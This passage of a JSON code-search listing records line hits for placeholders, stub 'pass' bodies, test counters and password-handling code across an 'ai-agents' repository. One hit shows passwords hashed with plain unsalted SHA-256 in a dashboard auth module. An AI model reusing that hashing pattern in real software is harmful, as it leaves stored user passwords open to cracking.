          "line": 143,
          "content": "placeholders.append({"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 150,
          "content": "self.add_warning(\"PLACEHOLDER_ANALYSIS\", str(file_path), f\"Failed to analyze: {e}\")"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 153,
          "content": "\"placeholders_found\": len(placeholders),"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 154,
          "content": "\"placeholder_details\": placeholders"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 157,
          "content": "def _is_problematic_placeholder(self, line: str, all_lines: List[str], line_index: int) -> bool:"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 158,
          "content": "\"\"\"Check if a placeholder is actually problematic\"\"\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 163,
          "content": "'raise notimplementederror',"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 164,
          "content": "'todo',"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 165,
          "content": "'fixme',"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 166,
          "content": "'not implemented',"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 167,
          "content": "'placeholder'"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 373,
          "content": "if 'your_key_here' in content.lower() or 'placeholder' in content.lower():"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 374,
          "content": "self.add_warning(\"CONFIG\", str(env_path), \"Contains placeholder values\")"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 473,
          "content": "results[\"placeholder_analysis\"] = self.diagnose_placeholders()"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 475,
          "content": "logger.error(f\"Placeholder analysis failed: {e}\")"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 476,
          "content": "results[\"placeholder_analysis\"] = {\"error\": str(e)}"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 540,
          "content": "# Placeholder issues"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 541,
          "content": "if \"placeholder_analysis\" in results:"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 542,
          "content": "placeholder_count = results[\"placeholder_analysis\"].get(\"placeholders_found\", 0)"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 543,
          "content": "if placeholder_count > 0:"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 547,
          "content": "\"issue\": f\"Found {placeholder_count} placeholder implementations\","
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 548,
          "content": "\"fix\": \"Replace placeholder functions with actual implementations\","
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 549,
          "content": "\"details\": results[\"placeholder_analysis\"].get(\"placeholder_details\", [])"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
          "line": 38,
          "content": "self.passed_count = 0"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
          "line": 61,
          "content": "status_symbol = \"[PASS]\" if status == \"PASS\" else \"[FAIL]\" if status == \"FAIL\" else \"[WARN]\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
          "line": 64,
          "content": "if status == \"PASS\":"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\config.py",
          "line": 322,
          "content": "\"password\": self.redis.redis_password,"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
          "line": 301,
          "content": "- Username/password"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\frameworks\\phase7_experimental_framework.py",
          "line": 188,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\frameworks\\phase7_experimental_framework.py",
          "line": 542,
          "content": "raise NotImplementedError"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\frameworks\\phase7_experimental_framework.py",
          "line": 546,
          "content": "raise NotImplementedError"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\frameworks\\phase7_experimental_framework.py",
          "line": 550,
          "content": "raise NotImplementedError"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\demo_engine.py",
          "line": 869,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\demo_engine.py",
          "line": 911,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_integration_tests.py",
          "line": 141,
          "content": "return {\"passed\": False, \"error\": \"System not set up\"}"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_integration_tests.py",
          "line": 194,
          "content": "return {\"passed\": False, \"error\": \"System not set up\"}"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_integration_tests.py",
          "line": 248,
          "content": "return {\"passed\": False, \"error\": \"System not set up\"}"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_integration_tests.py",
          "line": 301,
          "content": "return {\"passed\": False, \"error\": \"System not set up\"}"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_integration_tests.py",
          "line": 353,
          "content": "return {\"passed\": False, \"error\": \"System not set up\"}"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_integration_tests.py",
          "line": 395,
          "content": "return {\"passed\": False, \"error\": \"System not set up\"}"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_integration_tests.py",
          "line": 509,
          "content": "return {\"passed\": False, \"error\": \"System not set up\"}"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\templates\\base_agent.py",
          "line": 352,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\templates\\base_agent.py",
          "line": 405,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\templates\\base_agent.py",
          "line": 410,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\run_comprehensive_tests.py",
          "line": 343,
          "content": "summary = {\"passed\": 0, \"failed\": 0, \"skipped\": 0, \"errors\": 0}"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\run_comprehensive_tests.py",
          "line": 346,
          "content": "if \"passed\" in line and \"failed\" in line:"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\run_comprehensive_tests.py",
          "line": 371,
          "content": "total_passed = 0"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
          "line": 404,
          "content": "overall_pass = True"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tools\\tool_framework.py",
          "line": 58,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tools\\tool_framework.py",
          "line": 63,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\vector_memory.py",
          "line": 352,
          "content": "# This is a placeholder - replace with actual embedding model"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\vector_memory.py",
          "line": 665,
          "content": "# Placeholder methods for FAISS and ChromaDB operations not implemented yet"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\vector_memory.py",
          "line": 718,
          "content": "# Placeholder methods for ChromaDB recent/frequent queries"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\vector_memory.py",
          "line": 760,
          "content": "'memory_types': [],  # Placeholder"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\vector_memory.py",
          "line": 761,
          "content": "'avg_importance': 0.5,  # Placeholder"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\vector_memory.py",
          "line": 762,
          "content": "'common_tags': []  # Placeholder"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\vector_memory.py",
          "line": 766,
          "content": "\"\"\"Consolidate similar memories (placeholder implementation)\"\"\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\vector_memory.py",
          "line": 773,
          "content": "\"\"\"Get memories by tag (placeholder implementation)\"\"\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\advanced\\behavior_validator.py",
          "line": 649,
          "content": "# This is a placeholder - real implementation would need multi-agent test data"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\advanced\\behavior_validator.py",
          "line": 789,
          "content": "failed_tests = [t for t in test_results if not t.passed]"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_enterprise_api.py",
          "line": 154,
          "content": "\"password\": \"testpass\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_enterprise_api.py",
          "line": 738,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\integration\\test_phase6_component_interactions.py",
          "line": 41,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\integration\\test_phase6_component_interactions.py",
          "line": 1468,
          "content": "passed_tests = sum(1 for result in test_results if result.success)"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\integration\\test_phase6_component_interactions.py",
          "line": 1469,
          "content": "failed_tests = total_tests - passed_tests"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\integration\\test_phase6_integration.py",
          "line": 41,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\integration\\test_phase6_integration.py",
          "line": 45,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\run_phase7_tests.py",
          "line": 317,
          "content": "total = passed = failed = skipped = 0"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\run_phase7_tests.py",
          "line": 519,
          "content": "f.write(f\"**Overall Success:** {'✅ PASSED' if report.overall_success else '❌ FAILED'}\\n\\n\")"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_validation.py",
          "line": 274,
          "content": "memory_usage=0.0,  # TODO: Add memory tracking"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_validation.py",
          "line": 627,
          "content": "coherence_score = 0.8  # Placeholder - would need sophisticated coherence analysis"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_validation.py",
          "line": 715,
          "content": "if perf[\"pass_rate\"] < 0.8:"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
          "line": 41,
          "content": "'passed': self.passed,"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
          "line": 1190,
          "content": "passed_tests = [r for r in self.results if r.passed]"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "line": 217,
          "content": "\"\"\"Test authentication bypass attempts\"\"\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "line": 220,
          "content": "# Common authentication bypass attempts"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "line": 221,
          "content": "bypass_attempts = ["
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "line": 263,
          "content": "'admin': 'secure_password_hash_12345',"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "line": 264,
          "content": "'user1': 'user_password_hash_67890',"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "line": 542,
          "content": "async def test_authentication_bypass_attempts(self, security_framework):"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "line": 543,
          "content": "\"\"\"Test authentication bypass protection\"\"\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "line": 544,
          "content": "bypass_attempts = ["
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\base_algorithm.py",
          "line": 139,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\base_algorithm.py",
          "line": 144,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\base_algorithm.py",
          "line": 149,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\base_algorithm.py",
          "line": 154,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\networks.py",
          "line": 128,
          "content": "\"\"\"Forward pass returning mean and log_std\"\"\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\networks.py",
          "line": 417,
          "content": "Forward pass of mixing network"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\networks.py",
          "line": 496,
          "content": "\"\"\"Forward pass with noisy linear transformation\"\"\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\base_environment.py",
          "line": 179,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\base_environment.py",
          "line": 184,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\base_environment.py",
          "line": 265,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\base_environment.py",
          "line": 270,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\base_environment.py",
          "line": 275,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\base_environment.py",
          "line": 443,
          "content": "\"\"\"Create RGB array representation (placeholder)\"\"\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\base_environment.py",
          "line": 444,
          "content": "# Return simple placeholder image"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\performance_monitor.py",
          "line": 419,
          "content": "# Create placeholder for real-time updates"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\performance_monitor.py",
          "line": 420,
          "content": "placeholder = st.empty()"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\performance_monitor.py",
          "line": 480,
          "content": "with placeholder.container():"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
          "line": 25,
          "content": "# from .websocket_handler import WebSocketHandler  # Not implemented yet"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
          "line": 26,
          "content": "# from .metrics_collector import MetricsCollector  # Not implemented yet"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
          "line": 27,
          "content": "# from .visualization_engine import VisualizationEngine  # Not implemented yet"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
          "line": 28,
          "content": "# from .interaction_tracker import InteractionTracker  # Not implemented yet"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
          "line": 51,
          "content": "# self.websocket_handler = WebSocketHandler()  # Not implemented yet"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
          "line": 52,
          "content": "# self.metrics_collector = MetricsCollector()  # Not implemented yet"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
          "line": 53,
          "content": "# self.visualization_engine = VisualizationEngine()  # Not implemented yet"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
          "line": 54,
          "content": "# self.interaction_tracker = InteractionTracker()  # Not implemented yet"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\auth.py",
          "line": 69,
          "content": "\"\"\"Hash password using SHA-256\"\"\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\auth.py",
          "line": 70,
          "content": "return hashlib.sha256(password.encode()).hexdigest()"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\auth.py",
          "line": 97,
          "content": "\"\"\"Authenticate user with email and password\"\"\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\auth.py",
          "line": 101,
          "content": "stored_password = self.users[email]['password']"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\auth.py",
          "line": 188,
          "content": "email = st.text_input(\"📧 Email Address\", placeholder=\"Enter your email\")"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\auth.py",
          "line": 189,
          "content": "password = st.text_input(\"🔑 Password\", type=\"password\", placeholder=\"Enter your password\")"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\emergent_intelligence.py",
          "line": 754,
          "content": "# Placeholder for strategy innovation detection"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\emergent_intelligence.py",
          "line": 759,
          "content": "# Placeholder for learning acceleration detection"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\emergent_intelligence.py",
          "line": 826,
          "content": "# Placeholder for specialization detection"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\orchestrator.py",
          "line": 784,
          "content": "# Placeholder implementations for complex analysis methods"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\self_modification.py",
          "line": 344,
          "content": "# For now, return a placeholder"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\self_modification.py",
          "line": 345,
          "content": "return f\"# Current implementation for {agent_name}.{component}\\n# Placeholder for actual code extraction\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\self_modification.py",
          "line": 1149,
          "content": "'tests_passed': 0,"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\business_intelligence.py",
          "line": 1404,
          "content": "# For now, we'll create placeholder specialists"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\deployment_manager.py",
          "line": 983,
          "content": "# Placeholder implementations for complex operations"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\deployment_manager.py",
          "line": 1077,
          "content": "# Disaster recovery placeholder implementations"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\evolution_engine.py",
          "line": 1079,
          "content": "# Placeholder implementations for complex methods"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\evolution_engine.py",
          "line": 1122,
          "content": "return []  # Placeholder"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\evolution_engine.py",
          "line": 1126,
          "content": "return []  # Placeholder"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\evolution_engine.py",
          "line": 1226,
          "content": "# Additional helper methods with placeholder implementations"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\orchestration\\orchestrator.py",
          "line": 290,
          "content": "\"\"\"Execute task with agents in sequence, passing results forward\"\"\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\high_performance_optimization.py",
          "line": 122,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\high_performance_optimization.py",
          "line": 180,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\high_performance_optimization.py",
          "line": 249,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\high_performance_optimization.py",
          "line": 309,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\high_performance_optimization.py",
          "line": 311,
          "content": "optimizations_applied.append(\"Implemented efficient message passing with caching\")"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\optimized_causal_inference.py",
          "line": 619,
          "content": "\"\"\"Get cached discovery result - placeholder for actual cache implementation\"\"\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\optimized_causal_inference.py",
          "line": 624,
          "content": "\"\"\"Cache discovery result - placeholder for actual cache implementation\"\"\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\optimized_causal_inference.py",
          "line": 626,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\optimized_causal_inference.py",
          "line": 639,
          "content": "'cache_hit_rate': 'Not implemented',  # Would be calculated with Redis"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\optimized_causal_inference.py",
          "line": 640,
          "content": "'memory_usage_mb': 'Not implemented',  # Would use memory profiler"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\security\\behavioral_monitoring.py",
          "line": 466,
          "content": "# For now, return empty list as placeholder"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\security\\behavioral_monitoring.py",
          "line": 472,
          "content": "# For now, return empty list as placeholder"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 114,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 119,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 124,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 138,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 144,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 149,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 154,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 163,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 168,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 173,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 178,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 191,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 196,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 205,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 210,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 261,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 266,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 296,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 301,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 306,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 319,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 324,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 329,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 334,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 347,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 352,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 357,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
          "line": 362,
          "content": "pass"
        },
        {
